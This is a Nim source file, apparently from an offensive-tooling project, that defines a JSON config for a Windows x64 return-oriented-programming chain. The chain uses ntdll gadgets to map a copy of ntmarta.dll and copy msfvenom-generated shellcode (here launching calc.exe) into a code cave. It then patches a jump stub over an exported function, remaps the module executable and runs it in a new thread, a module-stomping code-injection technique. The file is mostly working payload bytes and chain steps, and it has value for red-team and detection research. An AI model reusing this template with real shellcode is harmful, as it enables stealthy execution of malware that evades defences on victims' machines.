#[
    Author: zimawhit3
    Github: https://github.com/zimawhit3
    License: BSD 3-Clause
]#
import json

proc ExampleROP*() : string =
    #[
        Example ROP Chain: Uses the unmap/map execution technique.
    ]#
    let
        Node : JsonNode = %*
            {
                    "Memorys":
                    [
                    
                    ],
                    "Payloads":
                    [
                        {
                            "Label": "JumpStub",
                            "Bytes": "0xE9,0x1B,0x0D,0x01,0x00",
                            "StoreLocation": "Stack",
                            "StoreOffset": -0x100
                        },
                        {
                        "Label": "PopCalcLOL",
                        "Bytes": 
                            [
                                #msfvenom -p windows/x64/exec CMD=calc.exe --arch x64 --platform windows EXITFUNC=thread -f csharp
                                "0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52",
                                "0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48",
                                "0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9",
                                "0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41",
                                "0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48",
                                "0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01",
                                "0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48",
                                "0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0",
                                "0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c",
                                "0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0",
                                "0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04",
                                "0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59",
                                "0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48",
                                "0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00",
                                "0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f",
                                "0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff",
                                "0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb",
                                "0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c",
                                "0x63,0x2e,0x65,0x78,0x65,0x00"
                            ],
                        "StoreLocation": "Stack",
                        "StoreOffset": -0x500
                        }
                    ],
                    "Gadgets":
                    [
                        {
                            "Name": "DefaultAdd",
                            "BytePattern": "0x49,0x03,0xC0,0xC3",
                            "GadgetModule": "ntdll.dll",
                            "GadgetType": "Add",
                            "Volatile": false,
                            "DestinationRegister": "RAX",
                            "SourceRegister": "R8",
                        },
                        {
                            "Name": "DefaultSink",
                            "BytePattern": "0xEB,0xFE",
                            "GadgetModule": "ntdll.dll",
                            "GadgetType": "Sink",
                            "Volatile": false,
                            "DestinationRegister": "REL",
                            "SourceRegister": "REL",
                        },
                        {
                            "Name": "DefaultBigPivot",
                            "BytePattern": "0x48,0x83,0xc4,0x58,0xc3",
                            "GadgetModule": "ntdll.dll",
                            "GadgetType": "AddImmediate",
                            "Volatile": false,
                            "DestinationRegister": "RSP",
                            "SourceRegister": "REL",
                        },
                        {
                            "Name": "DefaultSmallPivot",
                            "BytePattern": "0x48,0x83,0xc4,0x38,0xc3",
                            "GadgetModule": "ntdll.dll",
                            "GadgetType": "AddImmediate",
                            "Volatile": false,
                            "DestinationRegister": "RSP",
                            "SourceRegister": "REL",
                        },
                        {
                            "Name": "DefaultSetR8",
                            "BytePattern": "0x41,0x58,0xc3",
                            "GadgetModule": "ntdll.dll",
                            "GadgetType": "LoadImmediate",
                            "Volatile": true,
                            "DestinationRegister": "R8",
                            "SourceRegister": "R8"
                        },
                        {
                            "Name": "DefaultPopRegs",
                            "BytePattern": "0x58,0x5a,0x59,0x41,0x58,0x41,0x59,0x41,0x5a,0x41,0x5b,0xc3",
                            "GadgetModule": "ntdll.dll",
                            "GadgetType": "LoadImmediate",
                            "Volatile": true,
                            "DestinationRegister": "R11",
                            "SourceRegister": "RAX",
                        },
                        {
                            "Name": "DefaultStoreRax",
                            "BytePattern": "0x49,0x89,0x00,0xc3",
                            "GadgetModule": "ntdll.dll",
                            "GadgetType": "Store",
                            "Volatile": true,
                            "DestinationRegister": "R8",
                            "SourceRegister": "RAX",
                        },
                        {
                            "Name": "DefaultWrite",
                            "BytePattern": "0x48,0x89,0x11,0xc3",
                            "GadgetModule": "ntdll.dll",
                            "ModuleOffset": 0x13d66,
                            "GadgetType": "MainStore",
                            "Volatile": true,
                            "DestinationRegister": "RCX",
                            "SourceRegister": "RDX",
                        }
                    ],
                    "StartContext":
                    {
                        "Target": {"Type": "Gadget", "Value": "DefaultSink", "Offset": 0},
                        "RIP": {"Type": "Gadget", "Value": "DefaultWrite", "Offset": 3},
                        "RSP": {"Type": "Memory", "Value": "Stack", "Offset": 0x8}
                    },
                    "CodeChain":
                    [
                        # WriteModuleBaseToStack
                        [
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultPopRegs", "GadgetOffset": 0}, 
                            
                            # RAX = Source
                            {"Type": "Module", "Location": "Stack", "Value": "ntmarta.dll"},
                            
                            # RCX, RDX
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 2},
                            
                            # R8 = Dest
                            {"Type": "Memory", "Location": "Stack", "Value": "Stack", "MemoryOffset": -0x18},
                            
                            # R9, R10, R11
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 3},
                            
                            # RET
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultStoreRax"},
                        ],
                        # GetFileMapping
                        [
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultPopRegs"},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 2},
                            {"Type": "Int", "Location": "Stack", "Value": -1},
                            {"Type": "Int", "Location": "Stack", "Value": 64},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 3},
                            {"Type": "Function", "Location": "Stack", "Value": "CreateFileMappingA", "Module": "KERNEL32.DLL"}
                        ],
                        # CreateFileMappingA
                        [
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultSmallPivot"},
                            {"Type": "SHADOWSPACE", "Location": "Stack"},
                            {"Type": "ModuleSize", "Location": "Stack", "Value": "ntmarta.dll"},
                            {"Type": "Int", "Location": "Stack", "Value": 0},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 1},
                        ],
                        # SaveFileMapping
                        [
                            # First Save
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultSetR8"},
                            {"Type": "Memory", "Location": "Stack", "Value": "Stack", "MemoryOffset": 0x488},
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultStoreRax"},
                            
                            # Second Save
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultSetR8"},
                            {"Type": "Memory", "Location": "Stack", "Value": "Stack", "MemoryOffset": 0x120},
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultStoreRax"},
                        ],
                        # GetMapViewOfFile
                        [
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultPopRegs"},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 1},
                            {"Type": "Int", "Location": "Stack", "Value": 983071},
                            {"Type": "Int", "Location": "Stack", "Value": 0},
                            {"Type": "Int", "Location": "Stack", "Value": 0},
                            {"Type": "Int", "Location": "Stack", "Value": 0},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 2},
                            {"Type": "Function", "Location": "Stack", "Value": "MapViewOfFile", "Module": "KERNEL32.DLL"}
                        ],
                        # MapViewOfFile
                        [
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultSmallPivot"},
                            {"Type": "SHADOWSPACE", "Location": "Stack"},
                            {"Type": "Int", "Location": "Stack", "Value": 0},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 2},
                        ],
                        # SaveMappedViewOfFile
                        [
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultSetR8"},
                            {"Type": "Memory", "Location": "Stack", "Value": "Stack", "MemoryOffset": 0x208},
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultStoreRax"},

                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultSetR8"},
                            {"Type": "Memory", "Location": "Stack", "Value": "Stack", "MemoryOffset": 0x308},
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultStoreRax"},
                        ],
                        # LoadCodeCave
                        [
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultSetR8"},
                            {"Type": "CodeCaveRVA", "Location": "Stack", "Value": "ntmarta.dll", "Section": ".text"},
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultAdd"},
                        ],
                        # SaveMappedCodeCave
                        [
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultSetR8"},
                            {"Type": "Memory", "Location": "Stack", "Value": "Stack", "MemoryOffset": 0x290},
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultStoreRax"},
                        ],
                        # CopyModuleToMappedFile
                        [
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultPopRegs"},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 1},
                            {"Type": "Module", "Location": "Stack", "Value": "ntmarta.dll"},
                            {"Type": "Int", "Location": "Stack", "Value": 0},
                            {"Type": "ModuleSize", "Location": "Stack", "Value": "ntmarta.dll"},
                            {"Type": "Int", "Location": "Stack", "Value": 0},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 2},
                            {"Type": "Function", "Location": "Stack", "Value": "RtlCopyMemory", "Module": "ntdll.dll"}
                        ],
                        # RtlCopyMemory
                        [
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultSmallPivot"},
                            {"Type": "SHADOWSPACE", "Location": "Stack"},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 3},
                        ],
                        # CopyPayloadtoModuleCodeCave
                        [
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultPopRegs"},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 1},
                            {"Type": "Payload", "Location": "Stack", "Value": "PopCalcLOL"},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 1},
                            {"Type": "PayloadSize", "Location": "Stack", "Value": "PopCalcLOL"},
                            {"Type": "Int", "Location": "Stack", "Value": 0},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 2},
                            {"Type": "Function", "Location": "Stack", "Value": "RtlCopyMemory", "Module": "ntdll.dll"}
                        ],
                        # RtlCopyMemory
                        [
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultSmallPivot"},
                            {"Type": "SHADOWSPACE", "Location": "Stack"},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 3},
                        ],
                        # SetBaseMapAddress
                        [
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultPopRegs"},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 3},
                            {"Type": "FunctionRVA", "Location": "Stack", "Value": "GetExplicitEntriesFromAclW", "Module": "ntmarta.dll"},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 3},
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultAdd"},
                        ],
                        # SaveMappedFunctionAddress
                        [
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultSetR8"},
                            {"Type": "Memory", "Location": "Stack", "Value": "Stack", "MemoryOffset": 0x378},
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultStoreRax"},
                        ],
                        # CopyJumpStubToModuleFunction
                        [
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultPopRegs"},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 1},
                            {"Type": "Payload", "Location": "Stack", "Value": "JumpStub"},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 1},
                            {"Type": "PayloadSize", "Location": "Stack", "Value": "JumpStub"},
                            {"Type": "Int", "Location": "Stack", "Value": 0},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 2},
                            {"Type": "Function", "Location": "Stack", "Value": "RtlCopyMemory", "Module": "ntdll.dll"}
                        ],
                        # RtlCopyMemory
                        [
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultSmallPivot"},
                            {"Type": "SHADOWSPACE", "Location": "Stack"},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 3},
                        ],
                        # UnmapViewOfModule
                        [
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultPopRegs"},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 1},
                            {"Type": "Module", "Location": "Stack", "Value": "ntmarta.dll"},
                            {"Type": "Int", "Location": "Stack", "Value": -1},
                            {"Type": "Int", "Location": "Stack", "Value": 0},
                            {"Type": "Int", "Location": "Stack", "Value": 0},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 2},
                            {"Type": "Function", "Location": "Stack", "Value": "NtUnmapViewOfSection", "Module": "ntdll.dll"}
                        ],
                        # NtUnmapViewOfSection
                        [
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultSmallPivot"},
                            {"Type": "SHADOWSPACE", "Location": "Stack"},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 3},
                        ],
                        # "ReMapViewOfFile"
                        [
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultPopRegs"},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 1},
                            {"Type": "Int", "Location": "Stack", "Value": -1},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 1},
                            {"Type": "Memory", "Location": "Stack", "Value": "Stack", "MemoryOffset": -0x18},
                            {"Type": "Int", "Location": "Stack", "Value": 0},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 2},
                            {"Type": "Function", "Location": "Stack", "Value": "NtMapViewOfSection", "Module": "ntdll.dll"}
                        ],
                        # NtMapViewOfSection
                        [
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultBigPivot"},
                            {"Type": "SHADOWSPACE", "Location": "Stack"},
                            {"Type": "ModuleSize", "Location": "Stack", "Value": "ntmarta.dll"},
                            {"Type": "Int", "Location": "Stack", "Value": 0},
                            {"Type": "Memory", "Location": "Stack", "Value": "Stack", "MemoryOffset": -0x10},
                            {"Type": "Int", "Location": "Stack", "Value": 0x02},
                            {"Type": "Int", "Location": "Stack", "Value": 0},
                            {"Type": "Int", "Location": "Stack", "Value": 0x40},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 1},
                        ],
                        # FlushInstructions
                        [
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultPopRegs"},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 1},
                            {"Type": "Module", "Location": "Stack", "Value": "ntmarta.dll"},
                            {"Type": "Int", "Location": "Stack", "Value": -1},
                            {"Type": "ModuleSize", "Location": "Stack", "Value": "ntmarta.dll"},
                            {"Type": "Int", "Location": "Stack", "Value": 0},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 2},
                            {"Type": "Function", "Location": "Stack", "Value": "NtFlushInstructionCache", "Module": "ntdll.dll"}
                        ],
                        # NtFlushInstructionCache
                        [
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultSmallPivot"},
                            {"Type": "SHADOWSPACE", "Location": "Stack"},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 3},
                        ],
                        # CreateThreadArgs
                        [
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultPopRegs"},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 1},
                            {"Type": "Int", "Location": "Stack", "Value": 0},
                            {"Type": "Int", "Location": "Stack", "Value": 0},
                            {"Type": "Function", "Location": "Stack", "Value": "GetExplicitEntriesFromAclW", "Module": "ntmarta.dll"},
                            {"Type": "Int", "Location": "Stack", "Value": 0},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 2},
                            {"Type": "Function", "Location": "Stack", "Value": "CreateThread", "Module": "KERNEL32.DLL"}
                        ],
                        # CreateThread
                        [
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultSmallPivot"},
                            {"Type": "SHADOWSPACE", "Location": "Stack"},
                            {"Type": "Int", "Location": "Stack", "Value": 0},
                            {"Type": "Int", "Location": "Stack", "Value": 0},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 1},
                        ],
                        # SaveThreadHandle
                        [
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultSetR8"},
                            {"Type": "Memory", "Location": "Stack", "Value": "Stack", "MemoryOffset": 0x658},
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultStoreRax"},
                        ],
                        # WaitForThreadArgs
                        [
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultPopRegs"},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 1},
                            {"Type": "Int", "Location": "Stack", "Value": 0},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 1},
                            {"Type": "Int", "Location": "Stack", "Value": 0},
                            {"Type": "Int", "Location": "Stack", "Value": 0},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 2},
                            {"Type": "Function", "Location": "Stack", "Value": "NtWaitForSingleObject", "Module": "ntdll.dll"},
                        ],
                        # NtWaitForSingleObject
                        [
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultSmallPivot"},
                            {"Type": "SHADOWSPACE", "Location": "Stack"},
                            {"Type": "DONTCARE", "Location": "Stack", "Value": 3},
                            {"Type": "Gadget", "Location": "Stack", "Value": "DefaultSink"}
                        ]
                    ]
        }    
    result = $Node


proc ExampleJOP*() : string =
    #[
        TODO
    ]#
    let
        Node : JsonNode = %*
            {

            }




    result = $Node